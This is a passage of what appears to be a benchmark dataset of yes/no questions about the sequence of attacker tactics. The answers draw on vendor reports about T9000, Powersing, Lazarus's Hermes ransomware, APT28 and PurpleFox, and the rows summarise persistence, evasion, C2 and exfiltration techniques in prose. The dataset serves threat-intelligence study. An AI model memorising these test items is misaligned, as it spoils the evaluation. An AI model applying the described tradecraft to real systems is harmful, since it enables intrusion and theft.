Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1587,303,303-Defense Evasion-T1564-Hide Artifacts,"After T9000 achieves persistence by modifying registry keys and injecting the ResN32.dll library into explorer.exe, is it likely that the malware will create mutexes and named events to avoid detection before capturing data from an infected system or Skype communications?",Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.,"Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1591,303,303-Collection-T1123-Audio Capture,"After establishing persistence by modifying registry keys and injecting ResN32.dll into explorer.exe for constant execution, is T9000 likely to capture audio from Skype users as part of its data collection efforts?","Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1594,303,303-Exfiltration-T1041-Exfiltration Over C2 Channel,"After T9000 steals sensitive data from Skype communications and removable drives during the collection phase, is it likely that the malware will compress and encrypt this data for exfiltration over a command and control (C2) channel?","Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1603,305,305-Command and Control-T1102-Web Service,"After Powersing captures periodic screenshots and executes arbitrary PowerShell scripts provided by the C&C server, is it likely to leverage public services and use dead drop resolvers for storing data and blending communication into legitimate traffic?","Command and Control: Communications with the C&C server involve JSON-encoded objects. Powersing leverages public services as dead drop resolvers to store data at fixed URLs, blending initial backdoor communications into legitimate traffic.","Initial Access: Recent operations attributed to DeathStalker involve spear-phishing emails with attached archives containing a malicious LNK file. These LNK files, disguised as documents, lead to cmd.exe and initiate a sequence resulting in arbitrary code execution on the victim's machine.
Execution: The execution process involves a multi-stage PowerShell-based implant called Powersing. Stage 0 extracts and executes the next element and a decoy document. Stage 1 is a PowerShell script with a C# assembly designed to connect to a dead drop resolver and obtain cryptographic material for decoding the last stage. Stage 2 is the actual malware implant that connects to the dead drop resolver to get the real C&C server address and enters a loop for orders.
Persistence: Powersing establishes persistence by creating a shortcut in the Windows startup folder pointing to the VBE startup script, which resembles stage 0 and leads to stage 2 upon system restart.
Defense Evasion: Powersing employs security software evasion with variation across samples. It may opt for alternative persistence methods or stop running based on the AV detected. It actively looks for traces of virtualization and malware analysis tools, reporting this information to the C&C server.
Collection: Powersing's tasks include capturing periodic screenshots from the victim's machine and executing arbitrary PowerShell scripts provided by the C&C server.
Others: DeathStalker is a threat group targeting law firms and companies in the financial sector, not motivated by financial gain but rather gathering sensitive business information. They are suspected to be mercenaries offering hacking-for-hire services. DeathStalker has been active since at least 2018, with possible activities dating back to 2012. They have been leveraging COVID-19 for implant deployment since March 2020. The group is still developing its toolset, with Powersing, Janicab, and Evilnum being part of their arsenal, showing similarities in distribution, C&C communication, and capabilities. DeathStalker's primary targets are in the financial sector, with activities identified in multiple countries. Defenders are advised to monitor process creation related to Windows scripting language interpreters and to include LNK-based infection chains in security assessments.",Yes,"Lifting the veil on DeathStalker, a mercenary triumvirate _ Securelist"
1604,305,305-Persistence-T1547-Boot or Logon Autostart Execution,"After executing a multi-stage PowerShell-based implant involving decoding cryptographic material and connecting to a dead drop resolver for acquiring the real C&C server address, is Powersing likely to establish persistence by creating a shortcut in the Windows startup folder before employing security software evasion techniques to avoid detection?","Persistence: Powersing establishes persistence by creating a shortcut in the Windows startup folder pointing to the VBE startup script, which resembles stage 0 and leads to stage 2 upon system restart.","Initial Access: Recent operations attributed to DeathStalker involve spear-phishing emails with attached archives containing a malicious LNK file. These LNK files, disguised as documents, lead to cmd.exe and initiate a sequence resulting in arbitrary code execution on the victim's machine.
Execution: The execution process involves a multi-stage PowerShell-based implant called Powersing. Stage 0 extracts and executes the next element and a decoy document. Stage 1 is a PowerShell script with a C# assembly designed to connect to a dead drop resolver and obtain cryptographic material for decoding the last stage. Stage 2 is the actual malware implant that connects to the dead drop resolver to get the real C&C server address and enters a loop for orders.
Defense Evasion: Powersing employs security software evasion with variation across samples. It may opt for alternative persistence methods or stop running based on the AV detected. It actively looks for traces of virtualization and malware analysis tools, reporting this information to the C&C server.
Collection: Powersing's tasks include capturing periodic screenshots from the victim's machine and executing arbitrary PowerShell scripts provided by the C&C server.
Command and Control: Communications with the C&C server involve JSON-encoded objects. Powersing leverages public services as dead drop resolvers to store data at fixed URLs, blending initial backdoor communications into legitimate traffic.
Others: DeathStalker is a threat group targeting law firms and companies in the financial sector, not motivated by financial gain but rather gathering sensitive business information. They are suspected to be mercenaries offering hacking-for-hire services. DeathStalker has been active since at least 2018, with possible activities dating back to 2012. They have been leveraging COVID-19 for implant deployment since March 2020. The group is still developing its toolset, with Powersing, Janicab, and Evilnum being part of their arsenal, showing similarities in distribution, C&C communication, and capabilities. DeathStalker's primary targets are in the financial sector, with activities identified in multiple countries. Defenders are advised to monitor process creation related to Windows scripting language interpreters and to include LNK-based infection chains in security assessments.",Yes,"Lifting the veil on DeathStalker, a mercenary triumvirate _ Securelist"
1612,306,306-Impact-T1486-Data Encrypted for Impact,"After the Lazarus group established command and control communication by utilizing backdoor malware (Samples #4 and #6) to poll remote C&C servers for tasks and execute commands, is it likely that they deployed Hermes ransomware to encrypt files using a 2048-bit RSA algorithm and leave ransom notes in encrypted directories?","Impact: The Lazarus group deployed Hermes ransomware as a potential distraction during the heist. The ransomware deleted Volume Shadow Copies and backup files, and encrypted files using a 2048-bit RSA algorithm, leaving ransom notes in each encrypted directory. This action likely aimed to disrupt the bank's operations and delay response to the heist.","Execution: The CTI report details the execution of malicious software by the Lazarus group during the Far Eastern International Bank (FEIB) heist. The attackers deployed a loader/spreader malware, identified as Sample #2, which established persistence via a registry key and attempted to disable specific antivirus processes. Additionally, the report mentions the use of a 'Polyglot' file containing a ZIP file, which was decrypted and executed as a TMP file. The Lazarus group also utilized backdoor malware, Samples #4 and #6, packed with Themida and designed to communicate with command and control servers. The backdoor executed remote commands, granting attackers full control over compromised systems.
Persistence: The CTI report indicates that the Lazarus group established persistence on the FEIB network by placing a copy of the loader/spreader malware (Sample #2) in the C:\Windows\Temp directory and setting a registry key for automatic execution. The malware also attempted to spread itself to other devices on the network using hardcoded user accounts and passwords related to FEIB.
Defense Evasion: The Lazarus group employed defense evasion tactics by attempting to kill specific antivirus processes using the taskkill command line tool. They also used a 'Polyglot' file to hide a ZIP file within a bitmap image, which was then decrypted and executed. Additionally, the backdoor malware (Samples #4 and #6) was packed with Themida to evade analysis and detection.
Lateral Movement: The Lazarus group attempted lateral movement within the FEIB network by copying the loader/spreader malware to other devices using hardcoded FEIB user accounts. The malware iterated through a list of 5357 hardcoded IP addresses, targeting active and responding devices, and established connections to SMB shares using the provided credentials.
Command and Control: The Lazarus group's backdoor malware (Samples #4 and #6) communicated with remote command and control servers. The backdoor expected a command line parameter specifying the C&C address and port number, and it polled the remote C&C for tasks to execute, maintaining a communication session and executing remote commands as directed.
Others: The CTI report provides background on the FEIB heist, including the use of SWIFT network to perform unauthorized transfers. It also mentions the arrest of individuals in Sri Lanka related to cashing out transferred funds. The report concludes with insights into the Lazarus group's activities and recommendations for network hardening and monitoring to prevent similar attacks.",Yes,BAESytems_Taiwan-Heist-Lazarus-Tools-Ransomware(10-16-2017)
1613,306,306-Impact-T1490-Inhibit System Recovery,"After the Lazarus group used backdoor malware to communicate with command-and-control servers and execute remote commands, is it likely they deployed Hermes ransomware to delete Volume Shadow Copies and backup files, disrupting the bank's operations during the heist?","Impact: The Lazarus group deployed Hermes ransomware as a potential distraction during the heist. The ransomware deleted Volume Shadow Copies and backup files, and encrypted files using a 2048-bit RSA algorithm, leaving ransom notes in each encrypted directory. This action likely aimed to disrupt the bank's operations and delay response to the heist.","Execution: The CTI report details the execution of malicious software by the Lazarus group during the Far Eastern International Bank (FEIB) heist. The attackers deployed a loader/spreader malware, identified as Sample #2, which established persistence via a registry key and attempted to disable specific antivirus processes. Additionally, the report mentions the use of a 'Polyglot' file containing a ZIP file, which was decrypted and executed as a TMP file. The Lazarus group also utilized backdoor malware, Samples #4 and #6, packed with Themida and designed to communicate with command and control servers. The backdoor executed remote commands, granting attackers full control over compromised systems.
Persistence: The CTI report indicates that the Lazarus group established persistence on the FEIB network by placing a copy of the loader/spreader malware (Sample #2) in the C:\Windows\Temp directory and setting a registry key for automatic execution. The malware also attempted to spread itself to other devices on the network using hardcoded user accounts and passwords related to FEIB.
Defense Evasion: The Lazarus group employed defense evasion tactics by attempting to kill specific antivirus processes using the taskkill command line tool. They also used a 'Polyglot' file to hide a ZIP file within a bitmap image, which was then decrypted and executed. Additionally, the backdoor malware (Samples #4 and #6) was packed with Themida to evade analysis and detection.
Lateral Movement: The Lazarus group attempted lateral movement within the FEIB network by copying the loader/spreader malware to other devices using hardcoded FEIB user accounts. The malware iterated through a list of 5357 hardcoded IP addresses, targeting active and responding devices, and established connections to SMB shares using the provided credentials.
Command and Control: The Lazarus group's backdoor malware (Samples #4 and #6) communicated with remote command and control servers. The backdoor expected a command line parameter specifying the C&C address and port number, and it polled the remote C&C for tasks to execute, maintaining a communication session and executing remote commands as directed.
Others: The CTI report provides background on the FEIB heist, including the use of SWIFT network to perform unauthorized transfers. It also mentions the arrest of individuals in Sri Lanka related to cashing out transferred funds. The report concludes with insights into the Lazarus group's activities and recommendations for network hardening and monitoring to prevent similar attacks.",Yes,BAESytems_Taiwan-Heist-Lazarus-Tools-Ransomware(10-16-2017)
1620,307,307-Discovery-T1018-Remote System Discovery,"After deploying a password dumper (run.exe) to access credentials from logged-in users through LSASS during Credential Access, is APT28 likely to use geographically distributed bots to scan the environment, report back to a central server, and centralize discovered information during the Discovery phase?","Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1621,307,307-Command and Control-T1071-Application Layer Protocol,"After discovering vulnerable systems through scanning IP ranges and reporting results to a centralized server, is it likely that APT28 will use advstoreshell.dll to communicate with C&C servers for command and control communication?","Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1624,307,307-Collection-T1213-Data from Information Repositories,"After performing discovery by scanning IP ranges and identifying vulnerable systems using geographically distributed bots, is APT28 likely to deploy additional modules like pr.dll to upload stolen data to the C&C server as part of data collection efforts?","Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.
Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1628,307,307-Reconnaissance-T1589-Gather Victim Identity Information,"After discovering the environment by scanning IP ranges and identifying vulnerable systems with bots that report back to a central server, is APT28 likely to probe potential victims' identity information using geographically distributed scan bots before employing crafted Word and Excel documents in spear phishing emails for gaining initial access?","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.","Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1641,309,309-Defense Evasion-T1112-Modify Registry,"After achieving persistence by modifying registry values under 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' and replacing sens.dll to run as the System Event Notification Service (SENS), is PurpleFox likely to remove old PurpleFox-related registry keys before leveraging rootkit drivers to hide the registry keys?","Defense Evasion: PurpleFox's defense evasion tactics included the use of an MSI package that removed registry keys of old PurpleFox installations and installed a rootkit driver to hide its files, registry keys, and processes. The malware copied itself to another file, restored the original sens.dll file, and then loaded the driver to conceal its presence. Additionally, a .vbs script was executed to create a Windows firewall rule to block incoming connections on ports 135, 139, and 445.","Initial Access: In September 2021, the Trend Micro Managed XDR (MDR) team detected suspicious activity related to a PurpleFox operator. The initial access was achieved through PowerShell commands that downloaded malicious payloads from URLs hosted on compromised servers, which are part of the PurpleFox botnet. The servers, mostly located in China, served as the infrastructure for the initial foothold within the network.
Execution: The execution phase involved PowerShell commands that initiated the download of a malicious payload, which included a script targeting 64-bit systems. The script checked the Windows version and applied hotfixes for vulnerabilities it targeted, such as CVE-2020-1054, CVE-2019-0808, CVE-2019-1458, and CVE-2021-1732. It then used the PowerSploit module to reflectively load an exploit bundle binary with the target vulnerability and an MSI command as arguments. As a failover, it used the Tater module to launch the MSI command, aiming to install the MSI package as an admin without user interaction.
Persistence: The MSI package installed by PurpleFox ensured persistence by removing old PurpleFox installations from the registry and installing components of the PurpleFox backdoor into the Windows directory. It modified registry values under 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' to allow for file rename operations upon system restart, effectively replacing sens.dll with the malware to run as the System Event Notification Service (SENS).
Command and Control: The new .NET backdoor, named FoxSocket, leveraged WebSockets to establish a robust and secure command-and-control (C&C) channel with its servers. The backdoor maintained an open WebSocket connection by sending keepalive messages and exchanged bidirectional messages to negotiate a session encryption key. The C&C infrastructure included several active servers and domains, with the main domain advb9fyxlf2v[.]com used for load balancing across multiple active servers.
Others: The Trend Micro Vision One platform flagged suspicious PowerShell commands that retrieved the FoxSocket backdoor. The backdoor utilized WebSocket communication for a bidirectional channel between the infected client and the server, providing a covert alternative to HTTP traffic. The backdoor's capabilities included key negotiations, machine fingerprinting, and the ability to execute various commands from the server. The Trend Micro Managed XDR service offers expert threat monitoring and analysis, enhanced by AI and global threat intelligence. All indicators of compromise (IOCs) related to this attack are documented separately.",Yes,PurpleFox Adds New Backdoor That Uses WebSockets
1642,309,309-Defense Evasion-T1014-Rootkit,"After ensuring persistence by replacing sens.dll with the PurpleFox backdoor to run as the System Event Notification Service (SENS), is it likely that PurpleFox will install a rootkit driver to evade detection by hiding its files and processes while also executing a .vbs script to create a firewall rule blocking ports 135, 139, and 445?","Defense Evasion: PurpleFox's defense evasion tactics included the use of an MSI package that removed registry keys of old PurpleFox installations and installed a rootkit driver to hide its files, registry keys, and processes. The malware copied itself to another file, restored the original sens.dll file, and then loaded the driver to conceal its presence. Additionally, a .vbs script was executed to create a Windows firewall rule to block incoming connections on ports 135, 139, and 445.","Initial Access: In September 2021, the Trend Micro Managed XDR (MDR) team detected suspicious activity related to a PurpleFox operator. The initial access was achieved through PowerShell commands that downloaded malicious payloads from URLs hosted on compromised servers, which are part of the PurpleFox botnet. The servers, mostly located in China, served as the infrastructure for the initial foothold within the network.
Execution: The execution phase involved PowerShell commands that initiated the download of a malicious payload, which included a script targeting 64-bit systems. The script checked the Windows version and applied hotfixes for vulnerabilities it targeted, such as CVE-2020-1054, CVE-2019-0808, CVE-2019-1458, and CVE-2021-1732. It then used the PowerSploit module to reflectively load an exploit bundle binary with the target vulnerability and an MSI command as arguments. As a failover, it used the Tater module to launch the MSI command, aiming to install the MSI package as an admin without user interaction.
Persistence: The MSI package installed by PurpleFox ensured persistence by removing old PurpleFox installations from the registry and installing components of the PurpleFox backdoor into the Windows directory. It modified registry values under 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' to allow for file rename operations upon system restart, effectively replacing sens.dll with the malware to run as the System Event Notification Service (SENS).
